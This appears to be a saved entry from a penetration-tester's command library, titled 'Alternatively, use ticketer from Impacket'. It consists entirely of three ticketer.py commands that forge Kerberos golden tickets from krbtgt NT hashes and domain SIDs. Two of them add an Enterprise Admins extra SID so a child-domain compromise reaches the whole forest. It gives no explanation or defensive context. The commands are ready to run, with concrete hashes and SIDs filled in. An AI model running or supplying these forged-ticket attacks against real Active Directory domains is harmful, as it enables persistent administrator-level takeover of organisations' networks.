---
id: 8000d1db-8cce-49f1-a70a-b0fa986a457a
name: Alternatively, use ticketer from Impacket
type: command
executor: bash
data: './ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728
  -domain amity.local mbrody-da

  ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator
  -extra-sid SID_DOMAIN_B_ENTERPRISE_519

  ./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946
  -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519'
output: null
created_at: '2023-04-06T03:56:04.790462+00:00'
updated_at: '2023-04-10T20:26:04.568133+00:00'
---

# Alternatively, use ticketer from Impacket

```bash
./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da
ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519
./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519
```
